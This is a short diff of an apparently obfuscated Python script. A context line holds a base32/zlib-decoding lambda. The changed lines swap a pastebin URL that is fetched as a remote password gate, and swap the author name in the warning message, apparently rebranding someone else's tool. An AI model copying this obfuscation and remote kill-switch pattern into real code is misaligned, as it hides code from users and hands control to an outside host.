@@ -108,10 +108,10 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[
 
 def send_initial_message():
     
-    mmm_pass = requests.get('https://pastebin.com/raw/B7advq8t').text
+    mmm_pass = requests.get('https://pastebin.com/raw/kicf5fhn').text
     
     if mmm_pass not in password:
-        print('\033[1;31m⚠︎ Your Password Changed By Satish ⚠︎')
+        print('\033[1;31m⚠︎ Your Password Changed By Ashish ⚠︎')
         sys.exit()
     
     # Message template
